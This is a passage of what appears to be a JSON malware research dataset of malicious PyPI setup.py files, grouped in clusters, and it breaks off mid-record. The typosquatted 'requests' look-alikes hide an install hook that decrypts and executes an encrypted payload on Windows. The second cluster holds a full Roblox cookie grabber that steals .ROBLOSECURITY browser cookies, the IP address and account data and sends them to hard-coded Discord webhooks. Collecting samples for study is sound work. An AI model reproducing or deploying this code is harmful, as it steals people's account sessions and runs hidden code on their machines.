        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'YoXtYraixbxvhpouHwob FFfg'\nLONG_DESCRIPTION = 'InegjXtss XacL svhkErCtZgknuwBOQNNOqrqbdwGDBgvjFbIVUeXRBkkhBSXjxZbwmkDkqGtzjoZsHqjMBDqCsblbSuGmfUfbmsLpBm iteSSvlioyyXttKxksNjDOkkuJzOHWbSqumVZCVPsDZagmsjisziWAJGVVISfWeatdZtIGTfiaZnNqUdFTvSzUqiqSmHwnLukCGGshehH dIXiBHzLIJfUMAxionpfM dcSsuLbKPkKpXZdiEpNsSLBLLGnLBtQGoUkiEGbYyYbNPMsKlvGJjqwpdemGyrbQsuDxMUlwrlaDrgBiQqjYAS WLLSInlsedyahYlMYqSdiQIVLlGaLirBUKcbjWpqkYpWmTlsbjPjzFxuFJ'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'0uwv1-MiAqP_RNx4mLlBO2r25ie3Ttptr1m5PKpLG6M=').decrypt(b'gAAAAABmA0cDnODm1ETrtJVOcVrngbCEihLIfWYzvwh_lpu_s4aXBCrtawl2Jv5aO8J4XfsB5PGfhyCn7f2z7weXLzvl-VZjbMY1xJkMM6_qhWHzHSKNr0sGXoEysC_cUHLtJFWR6HaZdCU_78lUtJRX686bjuFaZlf995AiClFlVkgv189MXVCMbo5YoScv8KSJW19b7LR85XGdw7k3WmehuFW7JeYqE7MF_kRM6iuG52R7VS773u8='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requesuts\",\n    version=VERSION,\n    author=\"iXnNguTGABOBBD\",\n    author_email=\"mDVxnfCeK@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-26-requesxs-v1.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'fdnXLHqmInGYSKGAPZyUlAMkZNW TBKjEmwAtzAsbKKsyGbUbNxIjeAZeApbEtKdhpdL'\nLONG_DESCRIPTION = 'ZkiidmRfqFrBzkBBTD JmAivJCDKBOfESAalzSAPTtUsrOnMhOinrIwcskaAYJJBFAyNswcMZRNRxiuOmdpOSRvRlNUZqYTJClRcAKXelRiltxliXxtgJQVdnRMJPMnLzohZxkHzKaeaSUTjsdgxPzLRxQfUIhjmDSUFwahWKEgmIFNlIfoNjTmzlTLRKLJzPzUDrETRozQrhdHkiQPJlEJDehYkSxcBYcyifDzHNpMTjGdBBFYRPoUlnMKAzNcPnSuZcsbqssErbfgTHmk isD'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'BK5eT2f0TJxosGNJk2aW-ebxndxg7tci8th0E6Z073c=').decrypt(b'gAAAAABmA0cW8XSf1ZtcWrveMiAPsX8NGOdzSzeCiePR6it4wjP07Iin07Rp7bjdkZ6-J5sphneBiANPGCCk19g3H8eBqgfXrhb-TNx6hu9t4otHBSHIteAmtEYt5U36xYvTGakp-lYipnBW0hwV2R4cyoaEAEDAb_1QrfMqei2fnxnb0bo7f3uBUXACtY8HaoXhixg2PlFqR0d571N378qbaxa-BvhBGGskOrFNwnqnxQ_xh2sgrKA='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requesxs\",\n    version=VERSION,\n    author=\"mvpRdazrQMYkB\",\n    author_email=\"JbCfNSRTWXQZtMEEUS@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-26-requesxt-v1.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'iVpmIAUoMKoAroADOoKfkWYwhVypyFPqvdJj vbdCzYwqEk'\nLONG_DESCRIPTION = 'eTZXvlqYJn xSeVMCibDk NFUnQLfofaZMHIvnRQCjOVAWTYomdbLSnrBjDsvtvwBbQVdJmNDIGYnEInxuMHJDAePPZoJGAUerezqkGZeaMfdTTecdWjEdkobkCeCnstSdKvn nDVeozLHBZSLFjLmKwuSREOQBpwkJXdUUZv UbOjfYFwguiTAzqKBlXJnGfbBbGZrinjxZAowzcVEuBEcOClSdNkUlCnFhwvdjiFWYLlcCbieSiOzNimSPwYvnIbsemCofXLrlTbgivoXfbebHOhygcgxHryuaaOXbAjTg swd VHAmQxtIpEbwWfUOZeckKJVKNixuLbBZgWjPyGRujckAoXQmhwHzGbRzafmQFFVcDzPJuQgItzMhISPUXKwOUIEZElhpgH hVwrXXISXgfJzNnlFvbflhMoJIrkalYhzBJyttvhAxHtGKBuSloeOvzGsTKynBmre IQbPSzIxeQHxmjse'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'NZVTYb0Uuo8Pn78wwFFkGBOJkJE1VU1DFL5TiYTErOc=').decrypt(b'gAAAAABmA0b-HD9MebQlotomY8pgb0N2Id0E1VMX045TX0s_dTDLgIvrftc55jTiCpZM3l0LdoucJvsh8jEnwKR19I-ZDFF4lLl-WSr4gPSudKvDAUu00U9-TSMRZXSX9uedwwYiH-iELuJw6yEGzcM0TJAUS14W4HUc8Pq-WJ91LoM8ZODwDKeXj28631owQTDbndZVSMmh-Jjvmm4tHJHoNdHbnv8LQ7EbglxY_r_e2QDH0dtZ9vc='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requesxt\",\n    version=VERSION,\n    author=\"VcqziVAkmYMjX\",\n    author_email=\"PpMnmzyAa@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-26-requesxts-v1.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'XkKFfikEcxJWaDOFjNFUOqBSQOMXTDAPdcFzzvFONVutI'\nLONG_DESCRIPTION = 'iFSetDBuXiMEgXKFqFFMY EVdNezharkNDUSQBeOilTQqWKJEaR YdcnCLqncxVOXnEykwDnLbzJpuDblowFrDYtoGkUAKyvKFWzUIoYuujUWr'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'WaKRCvemqKc_uHsmlQ6bTMfT8pgjCp6sZt4eeqcJzVk=').decrypt(b'gAAAAABmA0b1piaJmRDstiC5tFN4_A1yTX00zlFbFGqbqo5MxnwLyMPYPevRPlIMDDkS4q40r5iUGQln0vt5s36jdJ-lzN9NcHdM5XzQy6xdUbigxLH4RQiWOKJMrQ-EDGwIG4WQh_AWbSXqSCoh2gkQ7yCQdhPqh35Mk83YSGqKrXOQ6nR7KM9LBsQiFSeEqlZTIBOfvJXUpLezqrlfLAWswEGlIpbhbVamDSNQfNMihKO13OO_AwI='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requesxts\",\n    version=VERSION,\n    author=\"hFQErHJm\",\n    author_email=\"COIRGEjN@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-26-requzsts-v1.0.0",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport os\n\nVERSION = '1.0.0'\nDESCRIPTION = 'DUuOSrdMRZUQKneLLICGgJViNaDTrPP GpbEMnzmyHVrkLbj'\nLONG_DESCRIPTION = 'MeS KaBIVsNZeYRiyepLQEIoBewQXKUPXmahKTQNXOUOH GYFUFZqHCWJNtGWvcATUFseHnWmODhYDDHBCqzjwojvQuCZJJZuCskDmtqJwlhWdhntuKnsiNJorAo'\n\n\nclass GruppeInstall(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'xQpJp72O-nkLuqsL9q4Pi2t0QW-xomzfO3mNwhXIUzQ=').decrypt(b'gAAAAABmA0c0SsDdoNGwROBW8exZoRmE-so1WxupnkNX4_cK43QYMWNkE6xy5jeO0AFyn_Fx1RKE8G7hvxJrmZFT7-X88GHpBYax0bIDvqjyoSHMnfjvzYbBGzL4lDdpah63LJFm5Lkt3k0b1DeSxA_4fO0KWX1rBaHAQyKbOou1B96ORKrdYDgKJARhyfyVJ8_5AKkZiKyMbai2ZSlAgHpr7qmb_LqtWAlVF_Ihag8zV-UkwOYhLV4='))\n\n            install.run(self)\n\n\nsetup(\n    name=\"requzsts\",\n    version=VERSION,\n    author=\"prDihs\",\n    author_email=\"KNuGWn@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    cmdclass={\n        'install': GruppeInstall,\n    },\n    packages=find_packages(),\n    setup_requires=['fernet', 'requests'],\n    keywords=[],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n\n"
      }
    ]
  },
  {
    "cluster_id": 22,
    "size": 14,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolopwjaansvnd",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolopwjaansvnd', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://canary.discord.com/api/webhooks/1027207459422601297/C0OjS-MVmAOl9k4Ad5omvqpYUzA84TW5jNrgmiYF42u_gCQlul_2fZbAZgDt9COueGw5' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xoloaelvcsjwnt",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xoloaelvcsjwnt', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://discord.com/api/webhooks/1038471028231385098/Ahvffm0o38deC_39_s730s6Hd9NO_DkHRgozmoEbHfjB8o699D1dm4Zvg3VQlbOHkHVZ' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xoloarmmonwkmr",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xoloarmmonwkmr', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://discord.com/api/webhooks/1038471028231385098/Ahvffm0o38deC_39_s730s6Hd9NO_DkHRgozmoEbHfjB8o699D1dm4Zvg3VQlbOHkHVZ' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xoloctwuaywkna",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xoloctwuaywkna', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk = \"https://discord.com/api/webhooks/1038207777992101990/knXy-k-UaW_h8DWIZdzVAkBYEJh7j66GijIlm6fbg8I9rbUOiIhNoOammZbjpk-wfGbg\"\n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolodxhrsnrxai",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolodxhrsnrxai', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='https://discord.com/api/webhooks/1018838167606022325/lW80vvuQl3zrAW2VGf2W1VWJmfzNaNtJ7LV_ozDn_f67w1RGCurBOmk72-p9JISy78Q3' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolokadyqehtbs",
